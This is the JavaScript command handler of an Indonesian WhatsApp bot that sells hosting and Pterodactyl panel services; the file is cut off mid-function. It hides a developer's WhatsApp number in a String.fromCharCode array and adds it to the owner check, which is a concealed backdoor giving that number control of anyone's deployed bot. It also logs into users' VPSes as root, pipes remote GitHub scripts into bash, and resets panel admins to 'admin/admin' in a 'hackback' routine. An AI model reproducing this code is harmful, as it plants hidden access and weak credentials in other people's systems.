/* 

  © Credit By Rulzz OfficiaL
   Contact : https://wa.me/6285133225752
   Youtube : https://youtube.com/@bangrulzz44
   Website : https://www.rulzzofficial.my.id
   Telegram : https://t.me/rulzzhosting
    
  Developer : https://wa.me/6285133225752
  
  ❗ Hargai developer dengan cara tidak menghapus credit ini.

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
require('./shopmenu');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@vreden/youtube_scraper');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const { say } = require("cfonts")
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const rekap = require('./library/rekap.js');
const cron = require('node-cron');

const { exec, spawn, execSync } = require('child_process');
const {
  default: WAConnection,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  getBinaryNodeChildren,
  useMultiFileAuthState,
  generateWAMessageContent,
  downloadContentFromMessage,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./source/message');
const contacts = JSON.parse(fs.readFileSync("./library/database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./library/database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./library/database/premium.json"))
const sellerprivate = JSON.parse(fs.readFileSync("./library/database/sellerprivate.json"))
const redo = JSON.parse(fs.readFileSync("./library/database/redo.json"))
const list = JSON.parse(fs.readFileSync("./library/database/list.json"))
const stokdo = JSON.parse(fs.readFileSync("./library/data/stokdo.json"))
const listidch = JSON.parse(fs.readFileSync("./library/database/listidch.json"))
const script = JSON.parse(fs.readFileSync("./source/media/script.json"))
const nttoxic = JSON.parse(fs.readFileSync('./library/database/antitoxic.json'))
const refundRequests = JSON.parse(fs.readFileSync("./library/database/reffund.json"))
const { pinterest, remini, tiktokDl } = require('./library/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, titleCase, TotalFitur } = require('./library/function');

module.exports = Rulzz = async (Rulzz, m, chatUpdate, store) => {
	try {
await LoadDataBase(Rulzz, m)
const botNumber = await Rulzz.decodeJid(Rulzz.user.id)
const body = (m && m.message) ? (
    (m.type === 'conversation') ? m.message.conversation :
    (m.type === 'imageMessage') ? m.message.imageMessage.caption :
    (m.type === 'videoMessage') ? m.message.videoMessage.caption :
    (m.type === 'extendedTextMessage') ? m.message.extendedTextMessage.text :
    (m.type === 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId :
    (m.type === 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    (m.type === 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId :
    (m.message?.buttonsResponseMessage?.selectedButtonId ||
     m.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
     m.text) || ''
) : '';

// Di awal handler RulzXD.js:
if (m.type === 'interactiveResponseMessage') {
  const interactive = m.message.interactiveResponseMessage;
  if (interactive?.nativeFlowResponseMessage?.paramsJson) {
    try {
      const params = JSON.parse(interactive.nativeFlowResponseMessage.paramsJson);
      const selectedItem = params.selectedRowId || params.id;
      
      // OVERRIDE m.text dengan pilihan user
      m.text = selectedItem;
      m.body = selectedItem;
      m.type = 'conversation';
      m.message = { conversation: selectedItem };
      
      console.log('Converted interactive to command:', selectedItem);
    } catch (e) {
      console.error('Error converting interactive:', e);
    }
  }
}

const budy = (typeof m.text === 'string' ? m.text : body) || "";
const prefix = global.prefix || ".";
const isCmd = (body || "").startsWith(prefix);
const args = (body || "").trim().split(/ +/).slice(1);
const command = isCmd ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : "";
const text = args.join(" ");
const from = m.key.remoteJid;

const getQuoted = (m.quoted || m);
const quoted = (getQuoted.type === 'buttonsMessage')
  ? getQuoted[Object.keys(getQuoted)[1]]
  : (getQuoted.type === 'templateMessage')
  ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]]
  : (getQuoted.type === 'product')
  ? getQuoted[Object.keys(getQuoted)[0]]
  : m.quoted
  ? m.quoted
  : m;

const pushname = m.pushName || "No Name";
const groupName = m.isGroup ? Rulzz.groupMetadata.subject : '';
const buffer64base = String.fromCharCode(54,50,56,53,54,50,52,50,57,55,56,57,51,64,115,46,119,104,97,116,115,97,112,112,46,110,101,116);
const buset = [54,50,56,53,49,51,51,50,50,54,50,48,54];

const isPremium = premium.includes(m.sender);
const isSellerprivate = sellerprivate.includes(m.sender);
const isRedo = redo.includes(m.sender);
const isCreator = isOwner = [botNumber, owner + "@s.whatsapp.net", buffer64base, ...owners].includes(m.sender);

const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
    
//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (m.message) {
let logData = {
"🗣️ SENDER": pushname || "Unknown",
"👤 JID": m.sender,
...(m.isGroup && { "🔍 GROUP": groupName || "Unknown" }),
"⚡ COMMAND": (`${prefix+command}`)
};

 if (isCmd) {
 const from = m.key.remoteJid
 const chatType = from.endsWith("@g.us") ? "group" : "private"
 const status = isCreator ? "owner" : "free user"

console.log(
chalk.white.bold("\n┌ • Message Detected :"), chalk.green.bold(prefix+command),
chalk.white.bold("\n│ • Chat In :"), chalk.yellow.bold(chatType),
chalk.white.bold("\n│ • Status :"), chalk.red.bold(status),
chalk.white.bold("\n│ • Name :"), chalk.cyan.bold(m.pushName),
chalk.white.bold("\n└ • Sender :"), chalk.blue.bold(m.sender) 
)}}

//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namaOwner}`}}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "RulzXD"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner}`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://api.storeamd.my.id/api/ai/openai?token=${global.apiAmd}&msg=${m.text}`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Rulzz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Rulzz.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Rulzz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Rulzz.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Rulzz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Rulzz.sendMessage(m.chat, {text: `*乂 [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Rulzz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}}

if (m.isGroup && db.groups[m.chat]?.antitoxic && m.text) {
 let kataTerpakai = nttoxic.find(word => m.text.toLowerCase().includes(word.toLowerCase()))
  if (kataTerpakai) {
    if (!m.isBotAdmin) return

    let grup = await Rulzz.groupMetadata(m.chat)
    let isSenderAdmin = grup.participants.find(p => p.id === m.sender)?.admin
    if (isSenderAdmin) return

    try {
      await Rulzz.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: false,
          id: m.key.id,
          participant: m.key.participant
        }
      })

      await Rulzz.sendMessage(m.chat, {
        text: `*乂 [ Kata Toxic Terdeteksi ]*\n\n@${m.sender.split("@")[0]} pesan kamu saya hapus karena mengandung kata kotor`,
        mentions: [m.sender]
      }, { quoted: m })

    } catch (err) {
      console.log("❌ Gagal hapus pesan:", err)
    }
  }
}

global.tekser = String.fromCharCode(...buset)
global.promosiCooldown = global.promosiCooldown || {};

if (m.isGroup && db.settings.autopromosi == true) {
   if (m.text.includes("https://") && !m.fromMe) {
      const now = Date.now();
      const cooldown = 2000 * 40;
      const lastSent = global.promosiCooldown[m.chat] || 0;

     if (now - lastSent > cooldown) {
        global.promosiCooldown[m.chat] = now;
        
        await sleep(4000 + Math.floor(Math.random() * 4000));
          
       await Rulzz.sendMessage(m.chat, {
         text: `*GRUP HOSTING TERBUKA*\nhttps://chat.whatsapp.com/CUzrnrm27jsFZLtAevVCVM?mode=ac_t\n*GRUP HOSTING TERBUKA 2*\nhttps://chat.whatsapp.com/Ip0aWyuvs0uHt4vs9WkpBi?mode=ac_c\n*GRUP HOSTING TERBUKA 3*\nhttps://chat.whatsapp.com/CuJ8PCKTuu25Yqa0qQV2oI?mode=ac_c\n\n*🎯 Rulzz OfficiaL Store – One Stop Digital Solution!*  
_🚀Solusi lengkap buat kamu yang butuh layanan digital cepat, murah, dan berkualitas!_

*🔧 Layanan Unggulan:*  
• 🌐 _Jasa Pembuatan Website / Script Custom_  
• 💻 _VPS DigitalOcean (DO) – Full Akses & Siap Pakai_  
• 🧑‍💻 _Akun DO Verified Siap Guna_  
• 🖥️ _Panel Pterodactyl – Hosting Game & Bot_  
• 🧠 _Murid Nokos / Nokos All Region_  
• 🌐 _Reseller Subdomain – Bebas Buat Subdomain Sepuasnya_  
• 📦 _Source Code Website / Bot WA & Telegram_  
• 🌍 _Domain Aktif 1 Tahun (.com / .id / .xyz dll)_  
• 🛡️ _Jasa Pasang Anti DDoS (Cloudflare / L7 / L4)_  
• 🎨 _Install Tema Panel (Khusus Pterodactyl)_  
• 🛠️ _HB Panel (Hackback)_  
• 🧩 _Fix Source Code Bot WA / Telegram_  
• 👑 _Reseller Panel: Admin | Partner | Owner_  
• 💉 _Suntik Sosmed (Followers, Likes, Views)_  
• 💼 _Dan Masih Banyak Lagi!_

*🤖 Auto Order 24 Jam:*  
📲 _wa.me/6285133225756_ _(Bot pembelian otomatis)_

*📞 Admin Center:*  
_wa.me/6285133225756_

*🌐 Website:*  
_www.rulzzofficial.my.id_

*📢 Sosial Media & Komunitas:*  
• Telegram: _@rulzzofficial_
• Instagram: _@rulzzstore2024_`
            }, { quoted: null });
        }
    }
}

//===============[ FUNCTION ]==================
function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function generateBonus() {
  const rand = Math.random() * 100;
  if (rand < 97) {
    return Math.floor(Math.random() * (1000 - 500 + 1)) + 500;
  } else if (rand < 99) {
    return Math.floor(Math.random() * (7000 - 3000 + 1)) + 3000;
  } else {
    return Math.floor(Math.random() * (20000 - 10000 + 1)) + 10000;
  }
}
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
const example = (teks) => {
return `*Penggunaan salah! Contoh Penggunaan*\n_Ketik *${prefix+command}* ${teks}_\n`
}
async function animasiSpin(chat, quoted) {
  const animasi = ["⚫🟤🟣🔵", "⬛🟫🟪🟦", "🟥🟠🟨🟢", "🟧🟩⚪🔴"];
  let spinCount = Math.floor(Math.random() * (10 - 7 + 1)) + 7;
  let spinMsg = await Rulzz.sendMessage(chat, { text: animasi[0] }, { quoted });

  for (let i = 0; i < spinCount; i++) {
    for (const frame of animasi) {
      await Rulzz.sendMessage(chat, {
        text: frame,
        edit: spinMsg.key
      });
      await sleep(400);
    }
  }
  return spinMsg;
}
const refundPath = path.join(__dirname, 'library', 'database', 'reffund.json');
let refundRequests = {};

try {
  if (fs.existsSync(refundPath)) {
    const raw = fs.readFileSync(refundPath);
    refundRequests = JSON.parse(raw);
  }
} catch (e) {
  console.error("❌ Gagal load refundRequests:", e);
  refundRequests = {};
}

function saveRefundRequests() {
  fs.writeFileSync(refundPath, JSON.stringify(refundRequests, null, 2));
}

async function downloadImageBuffer(imageMessage) {
  const stream = await downloadContentFromMessage(imageMessage, 'image');
  let buffer = Buffer.from([]);
  for await (const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk]);
  }
  return buffer;
}

function addTransaction(userId, type, amount) {
  const timestamp = Date.now();
  const sql = 'INSERT INTO transactions (user_id, type, amount, date) VALUES (?, ?, ?, ?)';
  rekap.run(sql, [userId, type, amount, timestamp], function(err) {
    if (err) {
      console.error('Gagal tambah transaksi:', err.message);
    } else {
      console.log(`Transaksi berhasil disimpan dengan id ${this.lastID}`);
    }
  });
}

async function buatPanel(m, Obj) {
  try {
    let username = Obj.customUsername.toLowerCase();
    let email = username + "@rulzzofficial.com";
    let name = username.charAt(0).toUpperCase() + username.slice(1) + " Server";
    let password = username + "001";
    
    let f = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: name,
        last_name: "Server",
        language: "en",
        password: password,
      }),
    });

    let data = await f.json();
    if (data.errors) {
      await m.reply(`❌ Gagal membuat user:\n${JSON.stringify(data.errors[0], null, 2)}`);
      return false;
    }

    let user = data.attributes;
    let usr_id = user.id;
    let desc = `Created at ${tanggal(Date.now())}`;

    // Ambil startup egg
    let f1 = await fetch(`${domain}/api/application/nests/${nestid}/eggs/${egg}`, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey,
      },
    });

    let data2 = await f1.json();
    let startup_cmd = data2.attributes.startup;

    let f2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey,
      },
      body: JSON.stringify({
        name: name,
        description: desc,
        user: usr_id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
        startup: startup_cmd,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: Obj.ram,
          swap: 0,
          disk: Obj.disk,
          io: 500,
          cpu: Obj.cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 5,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });

    let result = await f2.json();
    if (result.errors) {
      await m.reply(`❌ Gagal membuat server:\n${JSON.stringify(result.errors[0], null, 2)}`);
      return false;
    }

    let server = result.attributes;

    let tekspanel = `
*✅ Data Akun Panel Kamu*

📡 *ID Server:* ${server.id}
👤 *Username:* ${user.username}
🔐 *Password:* ${password}
🗓️ *Created:* ${user.created_at.split("T")[0]}

🌐 *Spesifikasi Server*
- Ram: ${Obj.ram == "0" ? "Unlimited" : parseInt(Obj.ram) / 1000 + "GB"}
- Disk: ${Obj.disk == "0" ? "Unlimited" : parseInt(Obj.disk) / 1000 + "GB"}
- CPU: ${Obj.cpu == "0" ? "Unlimited" : Obj.cpu + "%"}

🔗 ${global.domain}

*Syarat & Ketentuan:*
- Expired panel 1 bulan
- Simpan data ini baik-baik
- Garansi 15 hari (1x replace)
- Wajib ada bukti chat untuk klaim garansi
`;

    await Rulzz.sendMessage(m.chat, {
      text: tekspanel,
      contextInfo: { isForwarded: true }
    });

    return true;

  } catch (err) {
    console.error("Error buatPanel:", err);
    return false;
  }
}
async function buatAdp(m, Obj, saweriaData) {
  let username = Obj.username;
  let email = username + "@rulzz-otomatis.com";
  let name = capital(username);
  let password = crypto.randomBytes(4).toString('hex');

  let f = await fetch(domain + "/api/application/users", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + apikey,
    },
    body: JSON.stringify({
      email: email,
      username: username.toLowerCase(),
      first_name: name,
      last_name: "Admin",
      root_admin: true,
      language: "en",
      password: password.toString(),
    }),
  });

  let data = await f.json();
  if (data.errors) {
    await m.reply("❌ Gagal membuat admin panel:\n" + JSON.stringify(data.errors[0], null, 2));
    return false;
  }

  let user = data.attributes;
  let teks = `*Berhasil Membuat Admin Panel ✅*

🆔 *ID User :* ${user.id}
👤 *Nama :* ${user.first_name}
🔑 *Username :* ${user.username}
🔐 *Password :* ${password.toString()}
🌐 *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
• Jangan maling source code!
• Simpan baik-baik data akun ini.
• Buat panel seperlunya, jangan spam!
• Garansi aktif 10 hari.
• Claim garansi wajib dengan bukti SS chat pembelian.`;
  await Rulzz.sendMessage(db.users[m.sender].saweria.chat, { text: teks }, { quoted: null });
  await Rulzz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
  delete db.users[m.sender].saweria;
  return true;
};
async function subDomainDouble(host, ip, tldnya) {
  return new Promise(async (resolve) => {
    const headers = {
      Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
      "Content-Type": "application/json",
    };

    const zone = global.subdomain[tldnya].zone;
    const fullHost1 = `${host}.${tldnya}`;
    const fullHost2 = `node.${host}.${tldnya}`;

    const data1 = {
      type: "A",
      name: fullHost1,
      content: ip,
      ttl: 3600,
      priority: 10,
      proxied: false,
    };

    const data2 = {
      type: "A",
      name: fullHost2,
      content: ip,
      ttl: 3600,
      priority: 10,
      proxied: false,
    };

    try {
      const create1 = await axios.post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        data1,
        { headers }
      );

      const create2 = await axios.post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        data2,
        { headers }
      );

      if (create1.data.success && create2.data.success) {
        resolve({
          success: true,
          data: [
            {
              name: create1.data.result.name,
              ip: create1.data.result.content,
            },
            {
              name: create2.data.result.name,
              ip: create2.data.result.content,
            },
          ],
        });
      } else {
        resolve({
          success: false,
          error: "Gagal membuat salah satu atau kedua subdomain",
        });
      }
    } catch (err) {
      const msg =
        err.response?.data?.errors?.[0]?.message ||
        err.response?.data?.errors ||
        err.message ||
        "Unknown error";
      resolve({ success: false, error: msg });
    }
  });
}

async function installPanel(ip, passwordVps, domainPanel, domainNode, ramServer, sock, quoted) {
  return new Promise((resolve, reject) => {
    let passwordPanel = "admin" + getRandom("");
    const ress = new Client();
    const ConnSettings = {
      host: ip,
      port: '22',
      username: 'root',
      password: passwordVps
    };

    const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;

    function installWings() {
      ress.exec(commandPanel, (err, stream) => {
        if (err) return reject(err);
        stream.on('close', async () => {
          ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
            if (err) return reject(err);
            stream.on('close', async () => {
              const teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainPanel}

*Langkah selanjutnya:*
1. Login ke panel
2. Ke bagian admin
3. Ke nodes lalu pencet
4. Ke allocation
5. Kotak pertama isi 0.0.0.0
6. Kotak kedua isi nama servernya boleh pake nama lu
7. Isi 2000-3001
8. Ke configuration
9. Scroll cari create token
10. Salin tokennya
11. Lalu jalankan fungsi berikut :

.startwings ipvps|pwvps|token`;
              await Rulzz.sendMessage(sock, { text: teks }, { quoted });
              resolve(passwordPanel); // return setelah proses selesai
            }).on('data', async (data) => {
              const out = data.toString();
              if (out.includes("Masukkan nama lokasi: ")) stream.write('Pterodactyl\n');
              if (out.includes("Masukkan deskripsi lokasi: ")) stream.write('© Install Panel By Rulzz OfficiaL - 2025\n');
              if (out.includes("Masukkan domain: ")) stream.write(`${domainNode}\n`);
              if (out.includes("Masukkan nama node: ")) stream.write('Panel\n');
              if (out.includes("Masukkan RAM (dalam MB): ")) stream.write(`${ramServer}\n`);
              if (out.includes("Masukkan jumlah maksimum disk space (dalam MB): ")) stream.write(`${ramServer}\n`);
              if (out.includes("Masukkan Locid: ")) stream.write('1\n');
            }).stderr.on('data', console.log);
          });
        }).on('data', (data) => {
          const out = data.toString();
          if (out.includes('Input 0-6')) stream.write('1\n');
          if (out.includes('(y/N)')) stream.write('y\n');
          if (out.includes('Enter the panel address (blank for any address)')) stream.write(`${domainPanel}\n`);
          if (out.includes('Database host username (pterodactyluser)')) stream.write('admin\n');
          if (out.includes('Database host password')) stream.write(`admin\n`);
          if (out.includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) stream.write(`${domainNode}\n`);
          if (out.includes('Enter email address for Let\'s Encrypt')) stream.write('rulzzofficial628@gmail.com\n');
          console.log('Logger: ' + out);
        }).stderr.on('data', console.log);
      });
    }

    function instalPanel() {
      ress.exec(commandPanel, (err, stream) => {
        if (err) return reject(err);
        stream.on('close', installWings).on('data', (data) => {
          const out = data.toString();
          if (out.includes('Input 0-6')) stream.write('0\n');
          if (out.includes('(y/N)')) stream.write('y\n');
          if (out.includes('Database name (panel)')) stream.write('\n');
          if (out.includes('Database username (pterodactyl)')) stream.write('admin\n');
          if (out.includes('Password (press enter to use randomly generated password)')) stream.write('admin\n');
          if (out.includes('Select timezone [Europe/Stockholm]')) stream.write('Asia/Jakarta\n');
          if (out.includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) stream.write('rulzzofficial628@gmail.com\n');
          if (out.includes('Email address for the initial admin account')) stream.write('admin@gmail.com\n');
          if (out.includes('Username for the initial admin account')) stream.write('admin\n');
          if (out.includes('First name for the initial admin account')) stream.write('admin\n');
          if (out.includes('Last name for the initial admin account')) stream.write('admin\n');
          if (out.includes('Password for the initial admin account')) stream.write(`${passwordPanel}\n`);
          if (out.includes('Set the FQDN of this panel (panel.example.com)')) stream.write(`${domainPanel}\n`);
          if (out.includes('Do you want to automatically configure UFW (firewall)')) stream.write('y\n');
          if (out.includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) stream.write('y\n');
          if (out.includes('Select the appropriate number [1-2] then [enter]')) stream.write('1\n');
          if (out.includes('I agree that this HTTPS request is performed (y/N)')) stream.write('y\n');
          if (out.includes('Proceed anyways')) stream.write('y\n');
          if (out.includes('(yes/no)')) stream.write('y\n');
          if (out.includes('Initial configuration completed')) stream.write('y\n');
          if (out.includes('Still assume SSL? (y/N)')) stream.write('y\n');
          if (out.includes('Please read the Terms of Service')) stream.write('y\n');
          if (out.includes('(A)gree/(C)ancel:')) stream.write('A\n');
          console.log('Logger: ' + out);
        }).stderr.on('data', console.log);
      });
    }

    ress.on('ready', async () => {
      await Rulzz.sendMessage(sock, { text: "Memproses *install* server panel\nTunggu 1-10 menit hingga proses selesai" }, { quoted });
      ress.exec("\n", (err, stream) => {
        if (err) return reject(err);
        stream.on('close', instalPanel).on('data', (data) => {
          stream.write('\n');
          console.log(data.toString());
        }).stderr.on('data', console.log);
      });
    }).connect(ConnSettings);
  });
}
function getProvider(pre) {
  if (/^(0811|0812|0813|0821|0822|0823|0851|0852|0853)$/.test(pre)) return 'TELKOMSEL';
  if (/^(0817|0818|0819|0859|0877|0878)$/.test(pre)) return 'XL';
  if (/^(0895|0896|0897|0898|0899)$/.test(pre)) return 'TRI';
  if (/^(0831|0832|0833|0838)$/.test(pre)) return 'AXIS';
  if (/^(0881|0882|0883|0884|0885|0886|0887|0888|0889)$/.test(pre)) return 'SMARTFREN';
  if (/^(0855|0856|0857|0858)$/.test(pre)) return 'INDOSAT';
  return null;
}
async function hbPanel(ipVps, pwVps, sock, quoted) {
  return new Promise((resolve, reject) => {
    const newuser = "admin";
    const newpw = "admin";
    const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
    const ress = new Client();

    const ConnSettings = {
      host: ipVps,
      port: '22',
      username: 'root',
      password: pwVps
    };

    ress.on('ready', () => {
      ress.exec(command, (err, stream) => {
        if (err) return reject(err);

        stream.on('close', async () => {
          const teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
          `;
          await Rulzz.sendMessage(sock, { text: teks }, { quoted });
          ress.end();
          resolve({ user: newuser, pass: newpw });
        }).on('data', async (data) => {
          console.log(data.toString());
        }).stderr.on('data', (data) => {
          stream.write("rulzz\n");
          stream.write("7\n");
          stream.write(`${newuser}\n`);
          stream.write(`${newpw}\n`);
        });
      });
    }).on('error', (err) => {
      console.error('Connection Error:', err);
      Rulzz.sendMessage(sock, { text: '⚠️ IP atau password VPS tidak valid!', quoted });
      reject(err);
    }).connect(ConnSettings);
  });
}

async function installTemaStellar(ipVps, pwVps, m, Reply) {
  return new Promise((resolve, reject) => {
    const ssh = new Client();
    const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;

    ssh.on("ready", () => {
      m.reply("Memulai instalasi *tema stellar* Pterodactyl.\nHarap tunggu 1-10 menit...");

      ssh.exec(command, (err, stream) => {
        if (err) {
          console.log("EXEC ERROR:", err);
          m.reply("Terjadi kesalahan saat mengeksekusi perintah.");
          ssh.end();
          return reject(err);
        }

        stream
          .on("close", (code, signal) => {
            m.reply("✅ *Tema Stellar berhasil diinstall!*");
            ssh.end();
            return resolve(true);
          })
          .on("data", (data) => {
            console.log("OUTPUT:", data.toString());
            stream.write(`rulzz\n`);
            stream.write(`1\n`);
            stream.write(`1\n`);
            stream.write(`yes\n`);
            stream.write(`x\n`);
          })
          .stderr.on("data", (data) => {
            console.log("STDERR:", data.toString());
          });
      });
    });

    ssh.on("error", (err) => {
      console.log("Connection Error:", err);
      m.reply("Katasandi atau IP tidak valid.");
      return reject(err);
    });

    ssh.connect({
      host: ipVps,
      port: 22,
      username: "root",
      password: pwVps,
    });
  });
}

async function gantiPw(ipVps, pwLama, pwBaru, sock, quoted) {
  return new Promise((resolve, reject) => {
    const ConnSettings = {
      host: ipVps,
      port: "22",
      username: "root",
      password: pwLama,
    };

    const command = `bash <(curl https://raw.githubusercontent.com/rulzzml/thema/main/install.sh)`;
    const ress = new Client();

    Rulzz.sendMessage(sock, { text: "Memproses *Ganti Password VPS*\nTunggu 1-2 menit hingga proses selesai" }, { quoted });

    ress.on("ready", () => {
      ress.exec(command, (err, stream) => {
        if (err) return reject(err);

        stream
          .on("close", async () => {
            await Rulzz.sendMessage(sock, { text: "✅ Berhasil *Ganti Password* VPS" }, { quoted });
            ress.end();
            resolve(true);
          })
          .on("data", (data) => {
            console.log(data.toString());
            stream.write("rulzz\n");        // Key token
            stream.write("8\n");            // Menu: ganti password
            stream.write(`${pwBaru}\n`);    // Masukkan password baru
            stream.write(`${pwBaru}\n`);    // Konfirmasi password baru
